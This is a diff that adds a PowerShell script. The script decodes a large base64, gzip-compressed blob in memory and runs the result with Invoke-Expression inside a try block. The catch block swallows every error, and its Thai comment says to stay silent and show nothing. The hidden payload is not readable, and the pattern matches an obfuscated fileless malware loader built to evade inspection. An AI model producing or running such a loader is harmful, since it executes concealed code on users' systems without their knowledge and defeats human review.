@@ -1,0 +1,23 @@
+﻿$base64 = @'
+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
+'@
+
+$base64 = $base64 -replace '\s+', ''
+
+try {
+    $compressedBytes = [Convert]::FromBase64String($base64)
+    $ms = New-Object IO.MemoryStream(, $compressedBytes)
+    $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
+    $sr = New-Object IO.StreamReader($gz)
+    $payload = $sr.ReadToEnd()
+    
+    $sr.Dispose()
+    $gz.Dispose()
+    $ms.Dispose()
+    [GC]::Collect()
+    
+    Invoke-Expression $payload
+}
+catch {
+    # เงียบ ไม่แสดง error ใด ๆ
+}
